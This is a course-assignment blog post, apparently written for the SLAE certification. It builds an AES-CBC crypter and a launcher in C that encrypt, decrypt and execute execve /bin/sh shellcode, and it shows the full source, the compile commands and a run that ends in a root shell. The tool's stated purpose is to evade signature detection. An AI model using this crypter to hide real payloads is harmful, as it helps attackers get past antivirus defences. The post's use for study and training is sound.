# Assignment 7 - Custom Crypter

Today we're throwing down the landing gear and finishing up with SLAE! It's been a great ride and I've learned a lot on the journey. With this last assignment the goal is to create a program that encrypts shellcode, and a program that decrypts and runs that shellcode. This would assist if your shellcode was getting flagged, and you weren't able to bypass the signature with the basic polymorphic techniques covered in assignment 6.

## Problem Statement

* Create a custom crypter like the one shown in the "crypters" video
* Feel free to use any existing encryption schema
* Can use any programming language


## AES-CBC

For this challenge, I decided to go with the popular AES-256 encryption schema in CBC mode, and we decided to develop this in C. Since AES-256 is a popular schema, we knew we wouldn't have to reinvent the wheel. So, we grabbed a small portable copy from [kokke's github](https://github.com/kokke/tiny-AES-c). We also used the `execve` shellcode from the course for testing. Let's get started!


#### Compiling Tiny AES

One small step we needed to take in the beginning was to compile our AES library, so that we could use it throughout the rest of the assignment. That was done using the following command:

```bash
$ gcc -Wall -Os -c -o aes.o aes.c
```

On to the crypter!

### Encrypter

The encrypter's job would be to hold known shellcode, and encrypt it with a key given to it by the user. We came up with the implementation below.

**_crypter.c_**

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Enabling CBC must be done before including aes.h or at compile-time.
// For compile time, use -DCBC=1
#define CBC 1

#include "aes.h"

// execve /bin/sh
uint8_t shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void printHex(uint8_t* buffer, size_t size) {
    for (int i = 0; i < size; i++) {
        printf("\\x%02X", buffer[i]);
    }
    printf("\n");
}


void encrypt(char* givenKey, size_t size) {
    uint8_t key[32] = { 0 };
    uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    struct AES_ctx ctx;

    printf("\nEncrypting...");

    memcpy(key, givenKey, strlen(givenKey));
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_encrypt_buffer(&ctx, shellcode, size);

    printf("Done!\n");
}


int main(int argc, char* argv[])
{
    size_t shellcodeSize = sizeof(shellcode) - 1; // disregard null terminator
    size_t encryptedSize = (16 - (shellcodeSize % 16) + shellcodeSize); // account for padding
    printf("Original Shellcode:\n");
    printHex(shellcode, shellcodeSize);

    encrypt(argv[1], shellcodeSize);
    printf("\nEncrypted Shellcode:\n");
    printHex(shellcode, encryptedSize);

    return 0;
}
```

#### Compiling the Crypter

```bash
$ gcc -Wall -Os crypter.c aes.o aes.h -o crypter
```

#### Running the Crypter

```bash
$ ./crypter "brownee and coffee 4 life"
Original Shellcode:
\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62
\x69\x68\x2F\x2F\x2F\x2F\x89\xE3\x50\x89\xE2\x53\x89\xE1\xB0\x0B\xCD\x80

Encrypting...Done!

Encrypted Shellcode:
\x2F\x98\x36\x4B\xA8\xD1\x48\x01\x44\xBB\x3D\xCC\x15\xBB\x29\x08\x09\x63
\x79\x69\xB7\x0B\xEA\x9D\x7A\xEB\xE9\xE6\x01\x96\x7A\x56\xB8\x94\xD7\x08
\x67\x49\x1D\x31\x6E\xB4\x61\x08\x31\xB8\xC5\x40
```


### Decrypter / Launcher

Now that we've obtained our encrypted shellcode, we'll place that in our decrypter, shown below.

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Enabling CBC must be done before including aes.h or at compile-time.
// For compile time, use -DCBC=1
#define CBC 1

#include "aes.h"

// encrypted execve /bin/sh
uint8_t shellcode[] = "\x2F\x98\x36\x4B\xA8\xD1\x48\x01\x44\xBB\x3D\xCC\x15\xBB\x29\x08\x09\x63\x79\x69\xB7\x0B\xEA\x9D\x7A\xEB\xE9\xE6\x01\x96\x7A\x56\xB8\x94\xD7\x08\x67\x49\x1D\x31\x6E\xB4\x61\x08\x31\xB8\xC5\x40";

void printHex(uint8_t* buffer, size_t size) {
    for (int i = 0; i < size; i++) {
        printf("\\x%02X", buffer[i]);
    }
    printf("\n");
}


void decrypt(char* givenKey, size_t size) {
    uint8_t key[32] = { 0 };
    uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    struct AES_ctx ctx;

    printf("\nDecrypting shellcode...");

    memcpy(key, givenKey, strlen(givenKey));
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, size);

    printf("Done!\n");
}


int main(int argc, char* argv[])
{
    size_t encryptedSize = sizeof(shellcode) - 1; // disregard null terminator
    printf("Encrypted Shellcode:\n");
    printHex(shellcode, encryptedSize);

    decrypt(argv[1], encryptedSize);
    printf("\nDecrypted Shellcode:\n");
    printHex(shellcode, encryptedSize);

    printf("\nLaunching shellcode...\n");
    int (*ret)() = (int(*)())shellcode;
    ret();

    return 0;
}
```

This code takes our encrypted shellcode, and decrypts it using a key given by the user. Then, it calls the decrypted shellcode in order to launch our payload. Let's compile it and give it a shot.

#### Compiling the Decrypter

```bash
$ gcc -Wall -Os decrypter.c aes.o aes.h -o decrypter
```

#### Running the Decrypter

```bash
$ ./decrypter "brownee and coffee 4 life"
Encrypted Shellcode:
\x2F\x98\x36\x4B\xA8\xD1\x48\x01\x44\xBB\x3D\xCC\x15\xBB\x29\x08\x09\x63
\x79\x69\xB7\x0B\xEA\x9D\x7A\xEB\xE9\xE6\x01\x96\x7A\x56\xB8\x94\xD7\x08
\x67\x49\x1D\x31\x6E\xB4\x61\x08\x31\xB8\xC5\x40

Decrypting shellcode...Done!

Decrypted Shellcode:
\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62
\x69\x68\x2F\x2F\x2F\x2F\x89\xE3\x50\x89\xE2\x53\x89\xE1\xB0\x0B\xCD\x80
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

Launching shellcode...
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
```

Excellent, everything seems to be working, and our payload successfully executed.


## Wrapping Up

Well, SLAE has finally come to an end for me. In all honesty, this was a fantastic course, and I've learned so much from it. If you're thinking of taking it, or you're thinking of taking your OSCE, but aren't sure if you're ready, I absolutely recommend SLAE! ***SPOILER ALERT***, I passed my OSCE on the first try with 12 hours to spare, and I 100% believe that I wouldn't have been able to do it if I had not taken SLAE first. It's been a great way of familiarizing myself with the concepts and fundamentals of assembly in a way that I haven't explored before. Anyways, if you're still with me, thanks for reading along! And until next time, happy hacking!


###### SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1158
